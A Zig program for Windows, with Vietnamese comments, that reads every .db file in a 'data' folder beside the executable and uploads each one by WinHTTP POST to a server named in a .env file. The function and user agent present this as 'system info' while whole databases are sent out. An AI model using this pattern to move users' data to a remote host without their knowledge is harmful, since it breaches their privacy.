const std = @import("std");
const windows = std.os.windows;

const WINHTTP = struct {
    pub const HINTERNET = *opaque {};
    pub const LPCWSTR = [*:0]const u16;
    pub const DWORD = windows.DWORD;
    pub const LPVOID = windows.LPVOID;
    pub const BOOL = windows.BOOL;

    pub const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY = 0;
    pub const WINHTTP_QUERY_STATUS_CODE = 19;
    pub const WINHTTP_QUERY_FLAG_NUMBER = 0x20000000;

    extern "winhttp" fn WinHttpOpen(
        pszAgentW: LPCWSTR,
        dwAccessType: DWORD,
        pszProxyW: ?LPCWSTR,
        pszProxyBypassW: ?LPCWSTR,
        dwFlags: DWORD,
    ) callconv(windows.WINAPI) ?HINTERNET;

    extern "winhttp" fn WinHttpConnect(
        hSession: HINTERNET,
        pswzServerName: LPCWSTR,
        nServerPort: u16,
        dwReserved: DWORD,
    ) callconv(windows.WINAPI) ?HINTERNET;

    extern "winhttp" fn WinHttpOpenRequest(
        hConnect: HINTERNET,
        pwszVerb: LPCWSTR,
        pwszObjectName: LPCWSTR,
        pwszVersion: ?LPCWSTR,
        pwszReferrer: ?LPCWSTR,
        ppwszAcceptTypes: ?LPCWSTR,
        dwFlags: DWORD,
    ) callconv(windows.WINAPI) ?HINTERNET;

    extern "winhttp" fn WinHttpSendRequest(
        hRequest: HINTERNET,
        lpszHeaders: ?LPCWSTR,
        dwHeadersLength: DWORD,
        lpOptional: ?LPVOID,
        dwOptionalLength: DWORD,
        dwTotalLength: DWORD,
        dwContext: usize,
    ) callconv(windows.WINAPI) BOOL;

    extern "winhttp" fn WinHttpWriteData(
        hRequest: HINTERNET,
        lpBuffer: LPVOID,
        dwNumberOfBytesToWrite: DWORD,
        lpdwNumberOfBytesWritten: *DWORD,
    ) callconv(windows.WINAPI) BOOL;

    extern "winhttp" fn WinHttpReceiveResponse(
        hRequest: HINTERNET,
        lpReserved: ?LPVOID,
    ) callconv(windows.WINAPI) BOOL;

    extern "winhttp" fn WinHttpCloseHandle(hInternet: HINTERNET) callconv(windows.WINAPI) BOOL;

    extern "winhttp" fn WinHttpQueryHeaders(
        hRequest: HINTERNET,
        dwInfoLevel: DWORD,
        pwszName: ?LPCWSTR,
        lpBuffer: LPVOID,
        lpdwBufferLength: *DWORD,
        lpdwIndex: ?*DWORD,
    ) callconv(windows.WINAPI) BOOL;

    extern "winhttp" fn WinHttpReadData(
        hRequest: HINTERNET,
        lpBuffer: LPVOID,
        dwNumberOfBytesToRead: DWORD,
        lpdwNumberOfBytesRead: *DWORD,
    ) callconv(windows.WINAPI) BOOL;
};

// Fixed UTF-16 strings
const USER_AGENT = [_:0]u16{ 'Z', 'i', 'g', ' ', 'S', 'y', 's', 't', 'e', 'm', ' ', 'I', 'n', 'f', 'o' };
const POST_METHOD = [_:0]u16{ 'P', 'O', 'S', 'T' };

// Thêm hàm helper để chuyển đổi string sang UTF-16
fn stringToUtf16(allocator: std.mem.Allocator, input: []const u8) ![:0]u16 {
    return try std.unicode.utf8ToUtf16LeWithNull(allocator, input);
}

// Thêm hàm để đọc .env
fn getEnvValue(allocator: std.mem.Allocator, key: []const u8) ![]const u8 {
    // Thử đọc từ environment variable trước
    if (std.process.getEnvVarOwned(allocator, key)) |value| {
        return value;
    } else |_| {
        // Nếu không có env var, đọc từ file .env
        const env_file = try std.fs.cwd().openFile(".env", .{});
        defer env_file.close();

        const content = try env_file.readToEndAlloc(allocator, 1024 * 1024);
        defer allocator.free(content);

        var lines = std.mem.split(u8, content, "\n");
        while (lines.next()) |line| {
            var parts = std.mem.split(u8, line, "=");
            if (parts.next()) |k| {
                if (std.mem.eql(u8, std.mem.trim(u8, k, " "), key)) {
                    if (parts.next()) |v| {
                        return allocator.dupe(u8, std.mem.trim(u8, v, " \r"));
                    }
                }
            }
        }
        return error.EnvVarNotFound;
    }
}

pub fn sendSystemInfo() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    // Lấy đường dẫn thư mục thực thi
    const exe_dir_path = try std.fs.selfExePathAlloc(allocator);
    defer allocator.free(exe_dir_path);
    const exe_dir = std.fs.path.dirname(exe_dir_path) orelse return error.NoPath;

    // Tạo đường dẫn đến thư mục data
    const data_dir_path = try std.fs.path.join(allocator, &[_][]const u8{ exe_dir, "data" });
    defer allocator.free(data_dir_path);

    // Mở thư mục data với đường dẫn tuyệt đối
    var dir = try std.fs.openDirAbsolute(data_dir_path, .{ .iterate = true });
    defer dir.close();

    // Phần còn lại của hàm giữ nguyên
    var dir_iterator = dir.iterate();
    while (try dir_iterator.next()) |entry| {
        if (entry.kind != .file) continue;
        if (!std.mem.endsWith(u8, entry.name, ".db")) continue;

        std.debug.print("Đang xử lý file: {s}\n", .{entry.name});

        const file = try dir.openFile(entry.name, .{ .mode = .read_only });
        defer file.close();

        const file_size = try file.getEndPos();
        const file_content = try file.readToEndAlloc(allocator, file_size);
        defer allocator.free(file_content);

        try sendFileContent(file_content, entry.name);
    }
}

// Thay đổi hàm sendFileContent để sử dụng server host từ .env
fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    // Đọc các giá trị từ .env
    const server_host = try getEnvValue(allocator, "SERVER_HOST");
    defer allocator.free(server_host);
    const server_port_str = try getEnvValue(allocator, "SERVER_PORT");
    defer allocator.free(server_port_str);
    const upload_path = try getEnvValue(allocator, "UPLOAD_PATH");
    defer allocator.free(upload_path);
    const boundary = try getEnvValue(allocator, "BOUNDARY");
    defer allocator.free(boundary);

    // Chuyển đổi sang UTF-16
    const server_host_utf16 = try stringToUtf16(allocator, server_host);
    defer allocator.free(server_host_utf16);
    const upload_path_utf16 = try stringToUtf16(allocator, upload_path);
    defer allocator.free(upload_path_utf16);

    // Parse port number
    const server_port = try std.fmt.parseInt(u16, server_port_str, 10);

    // Tạo content type header với boundary động
    const content_type_buf = try std.fmt.allocPrint(allocator, "Content-Type: multipart/form-data; boundary={s}\r\n", .{boundary});
    defer allocator.free(content_type_buf);
    const content_type_header = try stringToUtf16(allocator, content_type_buf);
    defer allocator.free(content_type_header);

    // Create form-data body với boundary động
    var form_data = std.ArrayList(u8).init(allocator);
    defer form_data.deinit();

    try form_data.appendSlice("--");
    try form_data.appendSlice(boundary);
    try form_data.appendSlice("\r\n");
    try form_data.appendSlice("Content-Disposition: form-data; name=\"file\"; filename=\"");
    try form_data.appendSlice(file_name);
    try form_data.appendSlice("\"\r\n");
    try form_data.appendSlice("Content-Type: application/octet-stream\r\n\r\n");

    // Add file contents
    try form_data.appendSlice(file_content);

    // End form-data
    try form_data.appendSlice("\r\n--");
    try form_data.appendSlice(boundary);
    try form_data.appendSlice("--\r\n");

    // Initialize WinHTTP session
    const hSession = WINHTTP.WinHttpOpen(
        &USER_AGENT,
        WINHTTP.WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        null,
        null,
        0,
    ) orelse return error.WinHttpOpenFailed;
    defer _ = WINHTTP.WinHttpCloseHandle(hSession);

    // Connect to server
    const hConnect = WINHTTP.WinHttpConnect(
        hSession,
        server_host_utf16,
        server_port,
        0,
    ) orelse return error.WinHttpConnectFailed;
    defer _ = WINHTTP.WinHttpCloseHandle(hConnect);

    // Create request
    const hRequest = WINHTTP.WinHttpOpenRequest(
        hConnect,
        &POST_METHOD,
        upload_path_utf16,
        null,
        null,
        null,
        0,
    ) orelse return error.WinHttpRequestFailed;
    defer _ = WINHTTP.WinHttpCloseHandle(hRequest);

    // Send request with form-data
    if (WINHTTP.WinHttpSendRequest(
        hRequest,
        content_type_header,
        @as(WINHTTP.DWORD, @intCast(content_type_buf.len)),
        null,
        0,
        @intCast(form_data.items.len),
        0,
    ) == 0) {
        return error.WinHttpSendRequestFailed;
    }

    // Send form-data body
    var bytes_written: WINHTTP.DWORD = undefined;
    if (WINHTTP.WinHttpWriteData(
        hRequest,
        @ptrCast(form_data.items.ptr),
        @intCast(form_data.items.len),
        &bytes_written,
    ) == 0) {
        return error.WinHttpWriteDataFailed;
    }

    // Receive response
    if (WINHTTP.WinHttpReceiveResponse(hRequest, null) == 0) {
        return error.WinHttpReceiveResponseFailed;
    }

    // Check status code
    var status_code: WINHTTP.DWORD = undefined;
    var size: WINHTTP.DWORD = @sizeOf(WINHTTP.DWORD);
    if (WINHTTP.WinHttpQueryHeaders(
        hRequest,
        WINHTTP.WINHTTP_QUERY_STATUS_CODE | WINHTTP.WINHTTP_QUERY_FLAG_NUMBER,
        null,
        &status_code,
        &size,
        null,
    ) == 0) {
        return error.WinHttpQueryHeadersFailed;
    }

    if (status_code != 200) {
        std.log.err("Upload failed with status code: {}", .{status_code});
        return error.UploadFailed;
    }

    std.log.info("Database file uploaded successfully", .{});
}
